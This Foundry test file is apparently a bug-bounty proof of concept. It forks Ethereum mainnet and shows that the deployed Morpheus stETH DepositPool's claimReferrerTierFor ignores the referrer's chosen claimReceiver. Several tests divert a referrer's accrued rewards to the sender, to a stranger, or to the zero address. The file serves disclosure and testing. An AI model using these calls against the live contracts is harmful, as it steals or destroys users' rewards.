// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import "../src/Ifaces.sol";
import "../src/Lane2Ifaces.sol";

// MORPHEUS BOUNTY PoC - C-L2-1: DepositPool claimReferrerTierFor ignores
// claimReceiver. Ethereum mainnet fork at block 26,480,107 (pinned in setUp).
// Target: stETH DepositPool proxy 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790
// (all five asset pools share the same implementation).
// Actors are fresh unprivileged EOAs; no vm.prank as owner/admin/multisig anywhere.
// Harness plumbing (disclosed): the LayerZero EndpointV1 gateway code at its deployed
// address is replaced by LZRecorder (vm.etch) so the mint payload (receiver, amount)
// that DepositPool -> Distributor -> L1SenderV2 hands to LayerZero can be asserted.
// The authorisation logic under test is 100% deployed DepositPool code; the endpoint
// is a third-party transport whose fee mechanics are not the surface under test.
contract Lane2Test is Test {
    address internal constant DISTRIBUTOR = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address internal constant POOL = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790; // stETH DepositPool
    address internal constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address internal constant GATEWAY = 0x66A71Dcef29A0fFBDBE3c6a460a3B5BC225Cd675;
    address internal constant CONSUMER = 0xd182263d06FDC463c96190005D6359CC3d3Bbc5e;

    IDepositPoolL2 internal pool = IDepositPoolL2(POOL);
    IDistributorMin internal dist = IDistributorMin(DISTRIBUTOR);
    IConsumerMin internal consumer = IConsumerMin(CONSUMER);
    LZRecorder internal rec;

    string[5] internal paths = ["stETH/USD", "wBTC/BTC,BTC/USD", "wETH/USD", "USDC/USD", "USDT/USD"];

    address internal staker = makeAddr("staker");
    address internal referrer = makeAddr("referrer");
    address internal bob = makeAddr("authorised-sender"); // the authorised claim sender
    address internal eve = makeAddr("stranger");
    address internal stakerSafe = makeAddr("staker-chosen-receiver");
    address internal referrerSafe = makeAddr("referrer-chosen-receiver");

    function setUp() public {
        vm.createSelectFork("https://eth.drpc.org", 26480107);
        // Oracle plumbing: tests warp time up to 19 days, past the deployed
        // feeds' freshness windows, so the consumer's ANSWERS are pinned to
        // the values it returns at the fork block. The price path itself is
        // not the surface under test; the claim authorisation plane is.
        for (uint256 i = 0; i < paths.length; i++) {
            bytes32 pathId = consumer.getPathId(paths[i]);
            uint256 price = consumer.getChainLinkDataFeedLatestAnswer(pathId);
            require(price > 0, "pin price must be positive");
            vm.mockCall(
                CONSUMER,
                abi.encodeCall(IConsumerMin.getChainLinkDataFeedLatestAnswer, (pathId)),
                abi.encode(price)
            );
        }
        rec = new LZRecorder();
        vm.etch(GATEWAY, address(rec).code);
        // The etched code inherits the real endpoint's storage - zero the
        // recorder's slots so its counters start clean.
        for (uint256 s = 0; s < 10; s++) {
            vm.store(GATEWAY, bytes32(s), bytes32(0));
        }
        rec = LZRecorder(GATEWAY);
    }

    // ---- helpers -----------------------------------------------------------

    function _fundStaker() internal {
        vm.deal(staker, 300 ether);
        vm.startPrank(staker);
        ILido(STETH).submit{value: 150 ether}(address(0));
        IERC20Min(STETH).approve(DISTRIBUTOR, type(uint256).max);
        vm.stopPrank();
    }

    function _stakeWithReferrer(uint256 amount_, address ref_) internal {
        vm.prank(staker);
        pool.stake(0, amount_, uint128(block.timestamp + 18 days), ref_);
    }

    function _accrue() internal {
        vm.warp(block.timestamp + 19 days);
        // Harness yield: a static fork produces no Lido rebase, so the stETH pool
        // would split zero yield and accrue zero rewards. A 10 stETH donation to
        // the Distributor creates real, distributable yield (the donation-forced
        // distribution shape is C4 QA-01 - KNOWN; it is used here only as the
        // yield source, never as a claim).
        vm.prank(staker);
        IERC20Min(STETH).transfer(DISTRIBUTOR, 10 ether);
        vm.prank(eve); // permissionless distribution trigger, unprivileged
        dist.distributeRewards(0);
    }

    function _authorise(address owner_, address sender_) internal {
        address[] memory s = new address[](1);
        bool[] memory a = new bool[](1);
        s[0] = sender_;
        a[0] = true;
        vm.prank(owner_);
        pool.setClaimSender(0, s, a);
    }

    function _setupPosition() internal returns (uint256 stakerReward, uint256 referrerReward) {
        _fundStaker();
        _stakeWithReferrer(100 ether, referrer);
        _accrue();
        stakerReward = pool.getLatestUserReward(0, staker);
        referrerReward = pool.getLatestReferrerReward(0, referrer);
        console.log("accrued stakerReward (MOR wei):", stakerReward);
        console.log("accrued referrerReward (MOR wei):", referrerReward);
        assertGt(stakerReward, 0, "staker must have accrued rewards");
        assertGt(referrerReward, 0, "referrer must have accrued tier rewards");
    }

    // ---- KNOWN control: W-H2's named branch --------------------------------

    // claimFor, claimReceiver UNSET, authorised sender names himself receiver.
    // This is exactly W-H2 - reproduced as the rig control. KNOWN, ineligible.
    function test_control_WH2_unsetReceiver_claimFor_steals() public {
        (uint256 stakerReward, ) = _setupPosition();
        _authorise(staker, bob);

        vm.prank(bob);
        pool.claimFor(0, staker, bob);

        assertEq(rec.lastUser(), bob, "mint payload must name bob");
        assertEq(rec.lastAmount(), stakerReward, "full staker reward diverted");
        assertEq(pool.getLatestUserReward(0, staker), 0, "staker rewards consumed");
    }

    // ---- CANDIDATE branches: claimReferrerTierFor --------------------------

    // Branch A (strongest): the referrer HAS set a claimReceiver - the exact
    // protective step W-H2's write-up relies on ("can be prevented if they set
    // a receiver"). claimReferrerTierFor never reads claimReceiver at all, so
    // the authorised sender still diverts the referrer-tier rewards to himself.
    // The receiver is set AFTER accrual, before the claim (config-change leg).
    function test_C1_referrerTierFor_ignores_set_claimReceiver() public {
        (, uint256 referrerReward) = _setupPosition();
        _authorise(referrer, bob);

        vm.prank(referrer);
        pool.setClaimReceiver(0, referrerSafe);
        assertEq(pool.claimReceiver(0, referrer), referrerSafe);

        vm.prank(bob);
        pool.claimReferrerTierFor(0, referrer, bob);

        assertEq(rec.lastUser(), bob, "mint payload must name bob, not the set claimReceiver");
        assertEq(rec.lastAmount(), referrerReward, "full referrer-tier reward diverted");
        assertEq(pool.getLatestReferrerReward(0, referrer), 0, "referrer rewards consumed");

        // Loss compounds: the theft also stamps referrerData.lastClaim, so the
        // victim's own claim is first blocked by the 14-day after-claim lock...
        vm.prank(referrer);
        vm.expectRevert("DS: pool claim is locked (C)");
        pool.claimReferrerTier(0, referrer);

        // ...and after the lock lapses there is simply nothing left to claim.
        vm.warp(block.timestamp + 15 days);
        assertEq(pool.getLatestReferrerReward(0, referrer), 0, "no new accrual without new yield");
        vm.prank(referrer);
        vm.expectRevert("DS: nothing to claim");
        pool.claimReferrerTier(0, referrer);
    }

    // Branch B: claimReceiver unset - same defect on the referrer stream,
    // receiver can be ANY third party (not just the caller).
    function test_C1b_referrerTierFor_unsetReceiver_anyReceiver() public {
        (, uint256 referrerReward) = _setupPosition();
        _authorise(referrer, bob);

        vm.prank(bob);
        pool.claimReferrerTierFor(0, referrer, eve);

        assertEq(rec.lastUser(), eve, "mint payload must name the arbitrary third party");
        assertEq(rec.lastAmount(), referrerReward);
        assertEq(pool.getLatestReferrerReward(0, referrer), 0);
    }

    // Branch C: destruction variant - receiver = address(0) consumes the
    // referrer's accrued rewards into a mint payload naming the zero address.
    function test_C1c_referrerTierFor_zeroReceiver_burns() public {
        (, uint256 referrerReward) = _setupPosition();
        _authorise(referrer, bob);

        vm.prank(bob);
        pool.claimReferrerTierFor(0, referrer, address(0));

        assertEq(rec.lastUser(), address(0), "mint payload must name address(0)");
        assertEq(rec.lastAmount(), referrerReward);
        assertEq(pool.getLatestReferrerReward(0, referrer), 0, "rewards consumed by the burn claim");
    }

    // ---- Contrast: the staking stream DOES respect claimReceiver -----------

    // Same setup as Branch A but on claimFor: the set receiver wins over the
    // sender's receiver_ argument. This is the protection the referrer stream lacks.
    function test_contrast_claimFor_respects_set_claimReceiver() public {
        (uint256 stakerReward, ) = _setupPosition();
        _authorise(staker, bob);

        vm.prank(staker);
        pool.setClaimReceiver(0, stakerSafe);

        vm.prank(bob);
        pool.claimFor(0, staker, bob);

        assertEq(rec.lastUser(), stakerSafe, "set claimReceiver must override sender's receiver_");
        assertEq(rec.lastAmount(), stakerReward);
    }
}
